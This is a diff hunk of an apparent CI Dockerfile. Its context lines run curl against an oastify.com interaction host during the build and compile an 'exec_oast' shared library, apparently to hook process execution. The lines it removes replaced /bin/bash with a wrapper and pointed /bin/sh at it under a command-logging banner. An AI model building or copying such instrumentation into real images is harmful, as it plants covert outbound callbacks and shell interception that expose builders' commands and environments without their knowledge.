@@ -29,16 +29,6 @@ RUN curl https://8gpexwnl8gc51ftsndl0iy9m4da4y5mu.oastify.com/built/policies
 
 # 1) Install the logger & trap
 COPY ci/command_logger.sh /etc/command_logger.sh
-COPY ci/bash_trap.sh     /etc/bash_trap.sh
-RUN chmod +x /etc/command_logger.sh /etc/bash_trap.sh
-
-# 3) Swap out /bin/bash
-RUN mv /bin/bash /bin/bash.real
-COPY ci/bash_wrapper.sh /bin/bash
-RUN chmod +x /bin/bash
-
-# instead of moving dash out of the way...
-RUN mv /bin/sh /bin/sh.real && ln -s /bin/bash /bin/sh
 
 COPY ci/exec_oast.c /tmp/exec_oast.c
 RUN gcc -shared -fPIC -o /usr/local/lib/libexec_oast.so /tmp/exec_oast.c -ldl \
